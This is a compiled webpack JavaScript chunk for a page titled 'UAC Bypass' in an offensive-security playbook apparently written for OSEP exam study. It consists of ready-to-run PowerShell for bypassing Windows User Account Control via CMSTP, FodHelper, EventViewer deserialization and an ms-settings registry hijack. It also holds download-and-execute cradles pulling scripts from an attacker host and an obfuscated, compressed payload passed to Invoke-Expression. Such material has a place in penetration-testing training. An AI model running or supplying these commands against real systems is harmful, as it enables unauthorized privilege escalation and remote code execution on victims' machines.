"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[4712],{4099(e,n,s){s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"osep/Defense Evasion/UAC Bypass","title":"UAC Bypass","description":"UAC Bypass","source":"@site/docs/osep/Defense Evasion/UAC Bypass.md","sourceDirName":"osep/Defense Evasion","slug":"/osep/Defense Evasion/UAC Bypass","permalink":"/OSEP-Playbook/docs/osep/Defense Evasion/UAC Bypass","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Shutdown Firewall","permalink":"/OSEP-Playbook/docs/osep/Defense Evasion/Shutdown Firewall"},"next":{"title":"Cracking Hashes","permalink":"/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"}}');var o=s(4848),r=s(8453);const i={},l=void 0,a={},c=[{value:"<strong>UAC Bypass</strong>",id:"uac-bypass",level:3}];function d(e){const n={a:"a",code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h3,{id:"uac-bypass",children:(0,o.jsx)(n.strong,{children:"UAC Bypass"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Using CMSTP"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:'# Download the code from GitHub and then invoke it directly in memory\niex(iwr http://[ATTACKER_IP]/cmstp.ps1 -useb)\n\n# Execute it\nBypass-UAC -Command "curl http://[ATTACKER_IP]/worked"\n\n'})}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://github.com/expl0itabl3/uac-bypass-cmstp",children:"GitHub Reference"})}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Using FodHelper"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:"# Download the code from GitHub and then execute in\niwr -uri http://[ATTACKER_IP]/improved-fodhelper.ps1 -outfile C:\\\\Windows\\\\Tasks\\\\improved-fodhelper.ps1\n\n# Run it\n./improved-fodhelper.ps1\n\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Using EventViewer"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:"# RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.\n\n# Upload it to the victim\nImport-Module .\\Invoke-EventViewer.ps1\n\nInvoke-EventViewer\n[-] Usage: Invoke-EventViewer commandhere\nExample: Invoke-EventViewer cmd.exe\n\nPS C:\\Windows\\Tasks> Invoke-EventViewer cmd.exe\n[+] Running\n[1] Crafting Payload\n[2] Writing Payload\n[+] EventViewer Folder exists\n[3] Finally, invoking eventvwr\n\n"})}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://github.com/CsEnox/EventViewer-UACBypass",children:"GitHub Reference"})}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Using Manual Approach - ComputerDefaults"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:'New-Item "HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" -Force\nNew-ItemProperty "HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force\nSet-ItemProperty "HKCU:\\software\\classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value "C:\\Windows\\System32\\cmd.exe /c curl http://192.168.50.149/worked" -Force\nStart-Process "C:\\Windows\\System32\\ComputerDefaults.exe"\n\n'})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Heavily Obfuscated UAC Bypass"})}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"Prepare the command to be executed"}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:"$ipAddress = (ip addr show tun0 | grep inet | head -n 1 | cut -d ' ' -f 6 | cut -d '/' -f 1)\n$text = \"(New-Object System.Net.WebClient).DownloadString('http://$ipAddress/run3.txt') | IEX\"\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)\n$EncodedText = [Convert]::ToBase64String($bytes)\n$EncodedText\nexit\n\n"})}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"Encode your command"}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(New-Object System.Net.WebClient).DownloadString('http://[ATTACKER_IP]/run3.txt') | IEX\n\necho -en '(New-Object System.Net.WebClient).DownloadString(\"http://[ATTACKER_IP]/run3.txt\") | IEX' | iconv -t UTF-16LE | base64 -w 0\n\n"})}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsxs)(n.li,{children:["Insert the Base64 blob into the\xa0",(0,o.jsx)(n.code,{children:"code"}),"\xa0variable like the below"]}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:'# The result from the previous command\n$code = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA3AC8AcgB1AG4AMwAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA="\n\n'})}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsxs)(n.li,{children:["Create the\xa0",(0,o.jsx)(n.code,{children:"Bypass"}),"\xa0function"]}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:"function Bypass {\n[CmdletBinding()]\nparam (\n[Parameter (Position=0, Mandatory = $True)]\n[string]$code )\n\n(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9l3f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION\n}\n\n"})}),"\n",(0,o.jsxs)(n.ol,{children:["\n",(0,o.jsx)(n.li,{children:"Execute the code"}),"\n"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-powershell",children:"Bypass $code\n\n"})}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:(0,o.jsx)(n.a,{href:"https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md",children:"GitHub Reference"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453(e,n,s){s.d(n,{R:()=>i,x:()=>l});var t=s(6540);const o={},r=t.createContext(o);function i(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:i(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);